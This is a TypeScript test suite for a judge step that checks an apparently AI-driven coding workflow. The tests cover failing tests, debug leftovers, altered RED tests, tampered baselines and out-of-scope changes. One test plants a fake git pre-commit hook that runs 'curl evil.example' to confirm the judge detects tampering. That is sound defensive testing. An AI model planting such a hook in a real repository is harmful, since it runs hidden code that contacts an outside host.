import { describe, expect, test } from 'claude-code/testing'
import { flowCheck } from '../hooks/flow-check'
import { SCAN_DIFF_ARGS } from '../hooks/flow-scan'
import { mergeFindings, requiredIds, unsettled, withSigs } from '../hooks/flow-judging'
import { hashOf } from '../hooks/session'
import { redFile } from '../hooks/flow-build'
import { HOME } from './flow-fakes'
import { METHOD_HEAD, ROOT } from './flow-fakes'
import { added, agentRun, atB3, AUTHOR_TREE, duringJudge, editRecord, ended, GREEN_REPORT, HEAD, judgedRuns, lastTicket, latest, NEW_FAILED, OLD, RED_TREE, run, SRC, START, TEST_FILE, toB1, world, diffKey, type DriveOpts } from './flow-drive'

describe('flow-judging: B3, the judge', () => {
  test('all checks hold: the judge is green at the author\'s tree and the feature goes to review', async () => {
    const { w } = await atB3()
    expect(latest(w)).toMatchObject({ task: 'B4', feature: 'F-01', judge: { tree: AUTHOR_TREE, green: true, task: 'B3', f: 'F-01' } })
    expect(latest(w)?.findings).toEqual([])
  })

  test('a failing test: a debug ticket with the failing output and the pack, one debug round used', async () => {
    const { w } = await atB3({ exit: 1, out: 'FAIL tests/add.test.ts > AC-001 adds\nAssertionError: expected 2 to be 3', tests: [OLD, NEW_FAILED] })
    const r = latest(w), t = lastTicket(w)
    expect(r).toMatchObject({ task: 'B3', judge: { green: false, f: 'F-01' } })
    expect(t).toMatchObject({ kind: 'debug', routedType: 'tdd-guide', used: false })
    const text = w.session().value?.tickets[t?.id ?? ''] ?? ''
    expect(text).toContain('## DEBUG F-01')
    expect(text).toContain('AssertionError: expected 2 to be 3')
    expect(text).toContain('F-01: Add numbers')
    expect(text).toContain(`${METHOD_HEAD}\n\n---\nname: debugging-and-error-recovery\n---\nMETHOD debugging-and-error-recovery`)
    expect(text.indexOf(METHOD_HEAD)).toBeGreaterThan(text.indexOf('## PACK'))
    expect(text).toContain('\nThe approved command test fails. The output (first 60 lines):\n')
    expect(r?.counters[r?.features?.[0]?.key ?? '']?.d).toBe(1)
  })

  test('a red lint command: the debug ticket goes to the stack\'s build fixer, with its method, and names the command (AC-BF-1)', async () => {
    const { w } = await atB3({ lint: { exit: 1, out: 'src/add.ts:1:1: Unexpected console statement. [Error/no-console]' } })
    const r = latest(w), t = lastTicket(w)
    expect(r).toMatchObject({ task: 'B3', judge: { green: false, f: 'F-01' } })
    expect(t).toMatchObject({ kind: 'debug', routedType: 'build-error-resolver', model: 'sonnet', used: false })
    const text = w.session().value?.tickets[t?.id ?? ''] ?? ''
    expect(text).toContain('\nThe approved command lint fails. The output (first 60 lines):\n')
    expect(text).toContain('Unexpected console statement.')
    expect(text).toContain(`${METHOD_HEAD}\n\n---\nname: debugging-and-error-recovery\n---\nMETHOD debugging-and-error-recovery`)
    expect(r?.counters[r?.features?.[0]?.key ?? '']?.d).toBe(1)
  })

  test('a red test and a red lint at once: the ticket goes with the first red command in the approved order, whose output it carries (GAP-R2-0.6-84)', async () => {
    const { w } = await atB3({ exit: 1, out: 'AssertionError: expected 2 to be 3', tests: [OLD, NEW_FAILED], lint: { exit: 1, out: 'src/add.ts:1:1: Unexpected console statement. [Error/no-console]' } })
    const t = lastTicket(w), text = w.session().value?.tickets[t?.id ?? ''] ?? ''
    expect(t).toMatchObject({ kind: 'debug', routedType: 'tdd-guide' })
    expect(text).toContain('\nThe approved command test fails.')
    expect(text).not.toContain('Unexpected console statement.')
  })

  test('debug rounds stop at the cap', async () => {
    const { w } = await atB3({ exit: 1, tests: [OLD, NEW_FAILED] })
    for (let i = 0; i < 4; i += 1) {
      await agentRun(w, lastTicket(w)?.id ?? '', ended('REPRODUCE: test\nLOCALIZE: src/add.ts:1\nHYPOTHESIS: x\nFIX: src/add.ts:1-1\nGUARD: AC-001 adds'))
      await flowCheck(w.host)
    }
    expect(latest(w)?.blocked).toEqual({ reason: 'cap', vars: { scope: 'F-01', kind: 'debug' } })
  })

  test('an eval id no passing test proves is red', async () => {
    const { w } = await atB3({ tests: [OLD, { file: 'tests/add.test.ts', title: 'adds well', status: 'passed' }] })
    expect(lastTicket(w)?.kind).toBe('debug')
  })

  test('debug output left in the code is junk: J-1 opens and blocks until fixed or waived', async () => {
    const { w } = await atB3({ src: `${SRC}console.log('here')\n` })
    const r = latest(w)
    expect(r?.findings).toEqual([expect.objectContaining({ id: 'J-1', f: 'F-01', rubricId: 'debug-leftover', status: 'open' })])
    expect(r?.blocked).toMatchObject({ reason: 'junk', vars: { id: 'J-1', rule: 'debug-leftover' } })
    expect(judgedRuns(w)).toBeGreaterThan(0)
  })

  test('a junk finding carries the hash of its line in the judged tree, so it is known again when lines move (M-3)', async () => {
    const src = `${SRC}console.log('here')\n`
    const { w } = await atB3({ src, git: { [`cat-file blob ${AUTHOR_TREE}:src/add.ts`]: src } })
    expect(latest(w)?.findings).toEqual([expect.objectContaining({ id: 'J-1', rubricId: 'debug-leftover', sig: hashOf("console.log('here')") })])
  })

  test('a RED test changed by the author is a floor finding', async () => {
    const { w } = await atB3({ test: TEST_FILE.replace('toBe(3)', 'toBe(2)') })
    expect(latest(w)?.blocked).toMatchObject({ reason: 'redTestChanged', vars: { id: 'FL-1', feature: 'F-01', location: 'tests/add.test.ts' } })
  })

  test('a RED test changed into a trivial assertion names the RED-test block, not the trivial-assert floor (S6 run 2 of 2026-10-20)', async () => {
    const { w } = await atB3({ test: TEST_FILE.replace('expect(1 + 1).toBe(3)', 'expect(1).toBe(1)') })
    const r = latest(w)
    expect(r?.findings.map(x => x.rubricId)).toEqual(expect.arrayContaining(['red-test-changed', 'trivial-assert']))
    expect(r?.blocked).toMatchObject({ reason: 'redTestChanged', vars: { feature: 'F-01', location: 'tests/add.test.ts' } })
  })

  test('fewer tests ran than the baseline plus the new ones is a floor finding; a failing test is not', async () => {
    const { w } = await atB3({ tests: [OLD] })
    expect(latest(w)?.blocked).toMatchObject({ reason: 'floor', vars: { rule: 'fewer-tests', location: '2→1' } })
  })

  test('a change outside the feature\'s Files is a floor finding', async () => {
    const { w } = await atB3({ extra: added('src/other.ts', 'export const x = 1\n') })
    expect(latest(w)?.blocked).toMatchObject({ reason: 'floor', vars: { rule: 'out-of-scope', location: 'src/other.ts' } })
  })

  test('a MEDIUM finding is recorded but does not block', async () => {
    const { w } = await atB3({ src: `${SRC}// const a = 1;\n// const b = 2;\n// const c = 3;\n` })
    expect(latest(w)?.findings).toEqual([expect.objectContaining({ rubricId: 'commented-code', sev: 'MEDIUM', status: 'open' })])
    expect(latest(w)?.task).toBe('B4')
  })

  test('a changed ignored-file set is junk', async () => {
    const { w } = await atB3({ before: d => { (d.gitOut ?? {})['ls-files -o -i --exclude-standard --directory -z'] = 'stash.txt\0' } })
    expect(latest(w)?.blocked).toMatchObject({ reason: 'junk', vars: { rule: 'ignored-set' } })
  })

  test('a RED shape file changed after B1 is tampering', async () => {
    const { w } = await atB3({ before: (_d, x) => { const f = redFile(HOME, latest(x)?.flowId ?? ''); x.files.set(f, (x.files.get(f) ?? '').replace(/"lines":\["[0-9a-f]{16}"/, `"lines":["${'0'.repeat(16)}"`)) } })
    expect(latest(w)?.blocked).toMatchObject({ reason: 'tampered', vars: { file: expect.stringContaining('.red.json') } })
  })

  test('a baseline file changed after S3 is tampering: blocked once, counted once', async () => {
    const { w } = await atB3({ before: (_d, x) => { for (const [k, v] of x.files) if (k.endsWith('.baseline.json')) x.files.set(k, `${v} `) } })
    expect(latest(w)?.blocked).toMatchObject({ reason: 'tampered', vars: { file: expect.stringContaining('.baseline.json') } })
    expect(latest(w)?.selfBlocks).toBe(1)
  })

  test('junk waived while the judge runs does not block (the decision is taken on the newest record)', async () => {
    const { w, d } = await atB3({ src: `${SRC}console.log('here')\n` })
    expect(latest(w)?.blocked?.reason).toBe('junk')
    editRecord(w, r => { const { blocked: _b, ...rest } = r; return rest })
    duringJudge(d, () => editRecord(w, r => ({ ...r, findings: r.findings.map(x => (x.id === 'J-1' ? { ...x, status: 'waived' } : x)) })))
    await flowCheck(w.host)
    expect(latest(w)?.blocked).toBeUndefined()
    expect(latest(w)?.task).toBe('B4')
  })

  test('a baseline changed while the judge runs: blocked, and no green judge is written for that run', async () => {
    const { w } = await atB3({ before: (d, x) => duringJudge(d, () => { for (const [k, v] of x.files) if (k.endsWith('.baseline.json')) x.files.set(k, `${v} `) }) })
    expect(latest(w)?.blocked).toMatchObject({ reason: 'tampered' })
    expect(latest(w)?.task).toBe('B3')
    expect(latest(w)?.judge?.tree === AUTHOR_TREE && latest(w)?.judge?.green).toBeFalsy()
  })

  test('code that reaches the file system forces a security review', async () => {
    const { w } = await atB3({ src: `import { readFileSync } from 'node:fs'\n${SRC}` })
    expect(latest(w)?.frozen['security:F-01']).toBe('forced')
    expect(latest(w)?.task).toBe('B4')
  })

  test('a repository config file changed since setup is tampering, at any flow_check', async () => {
    const d: DriveOpts = { gitOut: { ...HEAD }, judge: { test: { exit: 0, report: GREEN_REPORT } } }
    const w = world(d)
    await toB1(w)
    await run(w, 'flow-build')
    w.files.set(`${ROOT}/.git/hooks/pre-commit`, '#!/bin/sh\ncurl evil.example\n')
    await agentRun(w, lastTicket(w)?.id ?? '', ended('Tests written.'))
    await flowCheck(w.host)
    expect(latest(w)?.blocked).toMatchObject({ reason: 'tampered', vars: { file: expect.stringContaining('.git/hooks/pre-commit') } })
  })
})

describe('flow-judging: pure parts', () => {
  test('required eval ids: the Required criteria of this feature and every earlier one, never an Optional one', () => {
    const plan = {
      acs: [{ id: 'AC-001', required: true, text: '' }, { id: 'AC-002', required: false, text: '' }, { id: 'AC-003', required: true, text: '' }],
      features: [{ id: 'F-01', title: 'a', acs: ['AC-001', 'AC-002'], files: [], security: false }, { id: 'F-02', title: 'b', acs: ['AC-003'], files: [], security: false }],
    }
    expect(requiredIds(plan, plan.features[0] as never)).toEqual(['AC-001'])
    expect(requiredIds(plan, plan.features[1] as never)).toEqual(['AC-001', 'AC-003'])
  })

  test('findings: new ones numbered on, gone ones resolved, a waived one kept as it is', () => {
    const old = [
      { id: 'FL-1', f: 'F-01', rubricId: 'skip-or-only', sev: 'HIGH' as const, loc: 'a:1', status: 'open' },
      { id: 'J-1', f: 'F-01', rubricId: 'debug-leftover', sev: 'HIGH' as const, loc: 'b:2', status: 'waived' },
    ]
    const out = mergeFindings(old, 'F-01', [{ kind: 'J', rule: 'debug-leftover', sev: 'HIGH', loc: 'b:2' }, { kind: 'FL', rule: 'trivial-assert', sev: 'HIGH', loc: 'c:3' }])
    expect(out.map(x => [x.id, x.status])).toEqual([['FL-1', 'resolved'], ['J-1', 'waived'], ['FL-2', 'open']])
    const again = mergeFindings(out, 'F-01', [{ kind: 'FL', rule: 'skip-or-only', sev: 'HIGH', loc: 'a:1' }, { kind: 'J', rule: 'debug-leftover', sev: 'HIGH', loc: 'b:2' }])
    expect(again.map(x => [x.id, x.status])).toEqual([['FL-1', 'open'], ['J-1', 'waived'], ['FL-2', 'resolved']])
  })

  test('a finding whose line moved keeps its id and status at its new line; an edited line is a new finding (535 trial M-3)', () => {
    const w = { f: 'F-01', rubricId: 'suppression', sev: 'HIGH' as const, status: 'waived' }
    const old = [{ ...w, id: 'FL-1', loc: 't.py:10', sig: 'S' }, { ...w, id: 'FL-2', loc: 't.py:20', sig: 'S' }]
    const fl = (loc: string, sig: string) => ({ kind: 'FL' as const, rule: 'suppression', sev: 'HIGH' as const, loc, sig })
    // three lines added above both, and a third copy of the same line further down: each old finding follows one copy
    const out = mergeFindings(old, 'F-01', [fl('t.py:13', 'S'), fl('t.py:23', 'S'), fl('t.py:40', 'S')])
    expect(out.map(x => [x.id, x.loc, x.status])).toEqual([['FL-1', 't.py:13', 'waived'], ['FL-2', 't.py:23', 'waived'], ['FL-3', 't.py:40', 'open']])
    // the waived line itself edited: the same place with other text is a new finding, never the waived one
    const edited = mergeFindings(out, 'F-01', [fl('t.py:13', 'T'), fl('t.py:23', 'S'), fl('t.py:40', 'S')])
    expect(edited.filter(x => x.status === 'open').map(x => [x.id, x.loc])).toEqual([['FL-3', 't.py:40'], ['FL-4', 't.py:13']])
    // a finding kept from before line hashes (no sig) still matches its place, and takes the line's hash from then on
    const legacy = mergeFindings([{ ...w, id: 'J-1', rubricId: 'debug-leftover', loc: 'a.py:2' }], 'F-01', [{ kind: 'J', rule: 'debug-leftover', sev: 'HIGH', loc: 'a.py:2', sig: 'U' }])
    expect(legacy).toEqual([{ ...w, id: 'J-1', rubricId: 'debug-leftover', loc: 'a.py:2', sig: 'U' }])
  })

  test('withSigs hashes the text of a finding\'s line; verify leaves out junk a feature settled wherever it moved, once per copy (M-3)', () => {
    const j = (loc: string) => ({ kind: 'J' as const, rule: 'debug-leftover', sev: 'HIGH' as const, loc })
    const found = withSigs([j('a.py:2'), j('a.py'), j('b.py:1'), j('a.py:4')], { 'a.py': 'x = 1\n  print(x)  \nz = 2\n  print(x)\n' })
    expect(found.map(x => x.sig)).toEqual([hashOf('  print(x)'), undefined, undefined, hashOf('  print(x)')])
    // a CRLF file hashes as LF; a line past the end has no hash (and no error)
    expect(withSigs([j('c.py:1'), j('c.py:9')], { 'c.py': '  print(x)\r\nz = 2\r\n' }).map(x => x.sig)).toEqual([hashOf('  print(x)'), undefined])
    // F-01 waived the print when it sat at line 9; verify raises only the second copy
    const settled = [{ id: 'J-1', f: 'F-01', rubricId: 'debug-leftover', sev: 'HIGH' as const, loc: 'a.py:9', status: 'waived', sig: hashOf('  print(x)') }]
    expect(unsettled(settled, found).map(x => x.loc)).toEqual(['a.py', 'b.py:1', 'a.py:4'])
  })

  test('deleting a waived copy instead of the open one never clears the open one, in a feature or at verify (M-3 security review)', () => {
    const p = 'P', j = (loc: string) => ({ kind: 'J' as const, rule: 'debug-leftover', sev: 'HIGH' as const, loc, sig: p })
    const d = (id: string, f: string, loc: string, status: string) => ({ id, f, rubricId: 'debug-leftover', sev: 'HIGH' as const, loc, status, sig: p })
    // B3: J-1 waived at line 5, J-2 open at line 20; line 5 is deleted, so the open copy now sits at 19
    const out = mergeFindings([d('J-1', 'F-01', 'a.py:5', 'waived'), d('J-2', 'F-01', 'a.py:20', 'open')], 'F-01', [j('a.py:19')])
    expect(out.map(x => [x.id, x.loc, x.status])).toEqual([['J-1', 'a.py:5', 'waived'], ['J-2', 'a.py:19', 'open']])
    // V4: verify's own open copy claims its line before the copy F-01 settled
    const settled = [d('J-1', 'F-01', 'a.py:5', 'waived')], own = [d('J-6', 'verify', 'a.py:20', 'open')]
    expect(unsettled(settled, [j('a.py:19')], own).map(x => x.loc)).toEqual(['a.py:19'])
    // and the right fix, deleting the open copy, leaves the settled copy at its place settled: nothing is raised
    expect(unsettled(settled, [j('a.py:5')], own)).toEqual([])
  })

  test('only a rule whose finding means the line alone follows a moved line, and never across a change of severity (M-3 security review)', () => {
    // a waived early `return` pasted into another test is a new finding there: its meaning is the test it sits in
    const ret = mergeFindings([{ id: 'FL-1', f: 'F-01', rubricId: 'conditional-return', sev: 'HIGH', loc: 't.py:10', status: 'waived', sig: 'R' }], 'F-01', [{ kind: 'FL', rule: 'conditional-return', sev: 'HIGH', loc: 't.py:30', sig: 'R' }])
    expect(ret.map(x => [x.id, x.loc, x.status])).toEqual([['FL-1', 't.py:10', 'waived'], ['FL-2', 't.py:30', 'open']])
    // the same line found with another severity (a MEDIUM mock-after-red now in the RED test) is a new finding
    const sev = mergeFindings([{ id: 'FL-1', f: 'F-01', rubricId: 'mock-after-red', sev: 'MEDIUM', loc: 't.py:3', status: 'open', sig: 'M' }], 'F-01', [{ kind: 'FL', rule: 'mock-after-red', sev: 'HIGH', loc: 't.py:3', sig: 'M' }])
    expect(sev.map(x => [x.id, x.sev, x.status])).toEqual([['FL-1', 'MEDIUM', 'resolved'], ['FL-2', 'HIGH', 'open']])
    // a HIGH at the place of a MEDIUM that is found again is a new finding of its own, not that one
    const m = { kind: 'FL' as const, rule: 'mock-after-red', loc: 't.py:3', sig: 'M' }
    const both = mergeFindings([{ id: 'FL-1', f: 'F-01', rubricId: 'mock-after-red', sev: 'MEDIUM', loc: 't.py:3', status: 'open', sig: 'M' }], 'F-01', [{ ...m, sev: 'MEDIUM' }, { ...m, sev: 'HIGH' }])
    expect(both.map(x => [x.id, x.sev, x.status])).toEqual([['FL-1', 'MEDIUM', 'open'], ['FL-2', 'HIGH', 'open']])
  })
})
